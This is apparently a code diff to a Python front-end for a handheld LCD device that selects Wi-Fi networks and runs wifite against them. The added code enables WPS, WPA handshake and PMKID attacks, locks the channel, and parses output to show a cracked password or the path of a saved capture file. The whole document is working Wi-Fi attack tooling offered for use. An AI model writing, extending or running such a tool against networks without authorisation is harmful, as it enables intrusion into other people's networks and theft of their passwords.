@@ -57,6 +57,7 @@ MENU_SELECTION = 0
 NETWORKS = []
 SCAN_PROCESS, ATTACK_PROCESS = None, None
 ATTACK_TARGET, CRACKED_PASSWORD = None, None
+CAPTURED_TYPE, CAPTURED_FILE = None, None  # 'PMKID' or 'HANDSHAKE'
 STATUS_MSG = "Ready"
 TARGET_SCROLL_OFFSET = 0
 
@@ -139,7 +140,9 @@ def validate_setup():
     LCD.LCD_ShowImage(IMAGE, 0, 0)
     
     interfaces = get_wifi_interfaces()
-    CONFIG['interface'] = interfaces[0]
+    # Prefer base (managed) interface; let wifite manage monitor mode
+    sel = interfaces[0]
+    CONFIG['interface'] = sel[:-3] if sel.endswith('mon') else sel
     
     DRAW.rectangle([(0,0),(128,128)], fill="BLACK")
     DRAW.text((10, 40), f"Using {CONFIG['interface']}", font=FONT_TITLE, fill="WHITE")
@@ -241,31 +244,68 @@ def start_scan():
     threading.Thread(target=scan_worker, daemon=True).start()
 
 def start_attack(network):
-    global APP_STATE, ATTACK_TARGET, CRACKED_PASSWORD, STATUS_MSG, ATTACK_PROCESS
-    APP_STATE = "attacking"; ATTACK_TARGET = network; CRACKED_PASSWORD = None; STATUS_MSG = "Initializing..."
-    cmd = ["wifite", "--bssid", network.bssid, "-i", CONFIG['interface']]
-    if not CONFIG['attack_wps']: cmd.append('--no-wps')
-    if not CONFIG['attack_wpa']: cmd.append('--no-wpa')
-    if not CONFIG['attack_pmkid']: cmd.append('--no-pmkid')
-    if CONFIG['clients_only']: cmd.append('--clients-only')
+    global APP_STATE, ATTACK_TARGET, CRACKED_PASSWORD, CAPTURED_TYPE, CAPTURED_FILE, STATUS_MSG, ATTACK_PROCESS
+    APP_STATE = "attacking"; ATTACK_TARGET = network; CRACKED_PASSWORD = None; CAPTURED_TYPE = None; CAPTURED_FILE = None; STATUS_MSG = "Initializing..."
+    # Use managed iface for wifite; it will toggle monitor mode itself
+    run_iface = CONFIG['interface'][:-3] if CONFIG['interface'].endswith('mon') else CONFIG['interface']
+    cmd = ["wifite", "--bssid", network.bssid, "-i", run_iface, "--kill"]
+    # Explicitly enable/disable attack types
+    if CONFIG['attack_wps']:
+        cmd.append('--wps')
+    else:
+        cmd.append('--no-wps')
+    if CONFIG['attack_wpa']:
+        cmd.append('--wpa')
+    else:
+        cmd.append('--no-wpa')
+    if CONFIG['attack_pmkid']:
+        cmd.append('--pmkid')
+    else:
+        cmd.append('--no-pmkid')
+    if CONFIG['clients_only']:
+        cmd.append('--clients-only')
+    # Prefer locking channel if known
+    try:
+        if network.channel and str(network.channel).isdigit():
+            cmd.extend(['-c', str(int(network.channel))])
+    except Exception:
+        pass
+
     def attack_worker():
-        global ATTACK_PROCESS, STATUS_MSG, CRACKED_PASSWORD, APP_STATE
+        global ATTACK_PROCESS, STATUS_MSG, CRACKED_PASSWORD, CAPTURED_TYPE, CAPTURED_FILE, APP_STATE
         try:
             ATTACK_PROCESS = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, universal_newlines=True)
             for line in iter(ATTACK_PROCESS.stdout.readline, ''):
                 if not IS_RUNNING or APP_STATE != "attacking": break
                 line_lower = line.lower()
+                # Status hints
                 if "wps pin attack" in line_lower: STATUS_MSG = "WPS PIN Attack..."
-                elif "wpa handshake" in line_lower: STATUS_MSG = "WPA Handshake Capture..."
-                elif "pmkid attack" in line_lower: STATUS_MSG = "PMKID Attack..."
-                elif "cracked" in line_lower:
-                    try: CRACKED_PASSWORD = line.split('"')[1]
-                    except IndexError: CRACKED_PASSWORD = "See logs"
-                    break
-                elif "failed" in line_lower: STATUS_MSG = "Attack failed."
+                elif "wpa handshake" in line_lower or ("handshake" in line_lower and "capture" in line_lower):
+                    STATUS_MSG = "WPA Handshake Capture..."
+                elif "pmkid" in line_lower and ("attack" in line_lower or "capture" in line_lower or "found" in line_lower):
+                    STATUS_MSG = "PMKID Attack..."
+                # Success signals
+                if "cracked" in line_lower:
+                    try:
+                        CRACKED_PASSWORD = line.split('"')[1]
+                    except IndexError:
+                        CRACKED_PASSWORD = "See logs"
+                if ("pmkid" in line_lower and ("found" in line_lower or "captured" in line_lower)):
+                    CAPTURED_TYPE = "PMKID"
+                if ("handshake" in line_lower and ("found" in line_lower or "captured" in line_lower)):
+                    CAPTURED_TYPE = "HANDSHAKE"
+                if "saved" in line_lower or "written" in line_lower:
+                    # try to extract a file path in quotes or after 'to'
+                    import re
+                    m = re.search(r'"([^"]+\.(?:pcap|pcapng|cap|hccapx|22000))"', line)
+                    if not m:
+                        m = re.search(r'\bto\s+([^\s]+\.(?:pcap|pcapng|cap|hccapx|22000))', line_lower)
+                    if m:
+                        CAPTURED_FILE = m.group(1)
             ATTACK_PROCESS.wait()
             if APP_STATE == "attacking": APP_STATE = "results"
-        except Exception as e: STATUS_MSG = f"Attack Error: {str(e)[:15]}"; time.sleep(2); APP_STATE = "targets"
+        except Exception as e:
+            STATUS_MSG = f"Attack Error: {str(e)[:15]}"; time.sleep(2); APP_STATE = "targets"
     threading.Thread(target=attack_worker, daemon=True).start()
 
 # ============================================================================
@@ -402,12 +442,18 @@ if __name__ == "__main__":
             elif APP_STATE == "results":
                 DRAW.text((40, 10), "Result", font=FONT_TITLE, fill="WHITE"); DRAW.line([(10, 30), (118, 30)], fill="#333", width=1)
                 if CRACKED_PASSWORD:
-                    DRAW.text((35, 40), "Success!", font=FONT_TITLE, fill="#00FF00")
+                    DRAW.text((35, 40), "Cracked!", font=FONT_TITLE, fill="#00FF00")
                     DRAW.text((5, 60), "Password:", font=FONT, fill="WHITE")
                     DRAW.text((5, 75), CRACKED_PASSWORD, font=FONT_TITLE, fill="#00FF00")
+                elif CAPTURED_TYPE:
+                    msg = "PMKID Captured" if CAPTURED_TYPE == "PMKID" else "Handshake Captured"
+                    DRAW.text((18, 40), msg, font=FONT_TITLE, fill="#00FF00")
+                    if CAPTURED_FILE:
+                        DRAW.text((5, 60), "Saved:", font=FONT, fill="WHITE")
+                        DRAW.text((5, 75), CAPTURED_FILE[:18], font=FONT, fill="#00FF00")
                 else:
                     DRAW.text((40, 40), "Failed", font=FONT_TITLE, fill="#FF0000")
-                    DRAW.text((5, 60), "Could not crack network.", font=FONT, fill="WHITE")
+                    DRAW.text((5, 60), "No capture or crack.", font=FONT, fill="WHITE")
                 DRAW.text((15, 110), "Press any key...", font=FONT, fill="#888")
 
             LCD.LCD_ShowImage(IMAGE, 0, 0)
